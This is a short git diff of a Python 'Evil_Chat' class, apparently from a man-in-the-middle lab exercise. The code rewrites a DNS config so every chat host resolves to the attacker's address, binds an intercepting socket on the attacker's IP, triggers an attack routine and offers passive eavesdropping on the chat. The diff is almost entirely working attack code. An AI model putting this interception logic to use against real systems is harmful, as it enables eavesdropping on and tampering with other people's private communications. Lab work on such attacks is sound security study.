@@ -54,7 +54,9 @@ class Evil_Chat(object):
         with open('dns_config - copy', 'w') as f:
             f.write(text)
         #
-
+        with open('dns_config - copy', 'r') as f:
+            ips = {l.split('=')[0]: l.split('=')[1] for l in f.readlines()}
+            self.dns_table.update(ips)
         with open('dns_config', 'w') as f:
             f.write('\n'.join([f'{name}={mitm_ip}:{ports["mitm"]}' for name in self.dns_table.keys()]))
 
@@ -164,7 +166,7 @@ class Evil_Chat(object):
         soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-        soc.bind((mitm_ip, ports['mitm']))
+        soc.bind((my_ip, ports['mitm']))
         soc.listen()
         while True:
             v1_soc, v1_addr = soc.accept()
@@ -177,11 +179,10 @@ class Evil_Chat(object):
 
         if 'y' in action.lower():
             self.do_attack()
-
-        with open('dns_config - copy', 'r') as f:
-            ips = {l.split('=')[0]: l.split('=')[1] for l in f.readlines()}
-
-        self.dns_table.update(ips)
+        else:
+            with open('dns_config - copy', 'r') as f:
+                ips = {l.split('=')[0]: l.split('=')[1] for l in f.readlines()}
+            self.dns_table.update(ips)
 
         mirror_chat = True if 'y' in input('Would you like to listen to chat passively? [Y/N]: ').lower() else False
 
